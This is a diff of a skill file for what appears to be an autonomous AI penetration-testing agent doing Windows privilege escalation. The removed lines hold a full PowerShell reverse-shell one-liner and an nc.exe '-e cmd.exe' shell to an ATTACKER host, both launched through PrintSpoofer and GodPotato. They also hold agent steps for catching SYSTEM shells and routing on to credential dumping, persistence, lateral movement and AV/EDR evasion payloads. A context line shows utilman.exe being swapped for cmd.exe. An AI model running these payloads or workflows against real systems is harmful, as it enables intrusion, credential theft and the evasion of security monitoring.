@@ -551,7 +551,7 @@ copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
 ```
 
 Or write a malicious DLL to a directory in the search path of a SYSTEM service.
-Route to **windows-service-dll-abuse** for targets.
+Escalate for targets.
 
 ### SeTakeOwnershipPrivilege → Own Any Object
 
@@ -600,119 +600,6 @@ $fs.Close()
 Use tools like RawCopy, FTK Imager, or The Sleuth Kit for structured extraction.
 
 ## Step 5: Escalate or Pivot
-
-### Reverse Shell via MCP
-
-When token impersonation achieves SYSTEM, **catch the SYSTEM shell via the MCP
-shell-server** rather than relying on an interactive console or local nc
-listener. Potato exploits and token theft techniques spawn a new process as
-SYSTEM -- route it to the shell-server for agent interaction.
-
-1. Call `start_listener(port=4444)` to prepare a catcher on the attackbox
-2. Point the Potato exploit's command at a reverse shell:
-   ```cmd
-   :: PrintSpoofer / GodPotato / JuicyPotato:
-   PrintSpoofer.exe -c "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
-   :: Or via nc.exe:
-   GodPotato-NET4.exe -cmd "cmd /c C:\temp\nc.exe ATTACKER PORT -e cmd.exe"
-   ```
-3. Call `stabilize_shell(session_id=...)` to upgrade to interactive PTY
-4. Verify the new privilege level with `send_command(session_id=..., command="whoami")`
-
-If the target lacks outbound connectivity, use `PrintSpoofer.exe -i -c cmd.exe`
-to spawn a local SYSTEM console and interact through an existing session, or
-use a bind shell payload.
-
-After achieving SYSTEM:
-
-- **Credential harvesting**: Route to **windows-credential-harvesting** for DPAPI,
-  browser creds, vault, cached credentials
-- **Domain context**: If domain-joined, route to **credential-dumping** for
-  DCSync/NTDS/SAM dumps, or **ad-discovery** for domain enumeration
-- **Persistence**: Route to **ad-persistence** or set up local persistence
-  (scheduled task, service, registry run key)
-- **Lateral movement**: Use harvested credentials with **pass-the-hash** or
-  **kerberos-roasting**
-
-When routing, pass along: hostname, SYSTEM access confirmed, OS version, domain
-membership.
-
-Report in your return summary: SYSTEM access achieved.
-
-## Stall Detection
-
-If you have spent **5 or more tool-calling rounds** on the same failure with
-no meaningful progress — same error, no new information, no change in output
-— **stop**.
-
-**What counts as progress:**
-- Trying a variant or alternative **documented in this skill**
-- Adjusting syntax, flags, or parameters per the Troubleshooting section
-- Gaining new diagnostic information (different error, partial success)
-
-**What does NOT count as progress:**
-- Writing custom exploit code not provided in this skill
-- Inventing workarounds using techniques from other domains
-- Retrying the same command with trivially different input
-- Compiling or transferring tools not mentioned in this skill
-
-If you find yourself writing code that isn't in this skill, you have left
-methodology. That is a stall.
-
-Do not loop. Work through failures systematically:
-1. Try each variant or alternative **once**
-2. Check the Troubleshooting section for known fixes
-3. If nothing works after 5 rounds, you are stalled
-
-**When stalled, return to the orchestrator immediately with:**
-- What was attempted (commands, variants, alternatives tried)
-- What failed and why (error messages, empty responses, timeouts)
-- Assessment: **blocked** (permanent — config, patched, missing prereq) or
-  **retry-later** (may work with different context, creds, or access)
-
-**When stalled:** Tell the user you're stalled, present what was tried, and
-recommend the next best path. Return findings to the orchestrator — it will
-decide whether to revisit with new context or route elsewhere.
-
-## AV/EDR Detection
-
-If a payload or tool binary is caught by antivirus or EDR — **do not retry
-with a different binary name or trivial modification. That is not progress.**
-
-### Recognition Signals (Token Impersonation)
-
-- **Potato binary blocked on execution**: File exists but "Access denied" or
-  "This program has been blocked by your administrator" on execution
-- **"Not a valid Win32 application"** when the binary IS valid: AV mangled the
-  PE headers during quarantine or on-access scan
-- **Binary deleted on transfer**: Uploaded Potato/exploit binary but it's gone
-  moments later — real-time protection quarantined it
-- **Process dies immediately after start**: Potato starts but is killed within
-  1-2 seconds with no output — behavioral detection
-- **PrintSpoofer/GodPotato exit silently**: Tool returns no output and no error
-  — EDR intercepted the token manipulation
-
-### What to Do
-
-1. **Stop immediately** — do not retry with the same binary or a different
-   Potato variant (they share signatures)
-2. **Note what was caught**: which binary, which Potato variant, exact error
-3. **Return to orchestrator** with structured AV-blocked context:
-
-```
-
-### AV/EDR Blocked
-- Payload: <what was attempted> (e.g., "GodPotato.exe for SeImpersonate abuse")
-- Detection: <what happened> (e.g., "binary deleted on transfer")
-- AV product: <if known> (e.g., "CrowdStrike Falcon")
-- Technique: <what token exploit needs> (e.g., "SeImpersonate → SYSTEM")
-- Payload requirements: <what is needed> (e.g., "EXE that executes command as SYSTEM")
-- Target OS: <version>
-- Current access: <user and method>
-```
-
-The orchestrator will route to **av-edr-evasion** to build a bypass payload,
-then re-invoke this skill with the AV-safe artifact.
 
 ## Troubleshooting
 
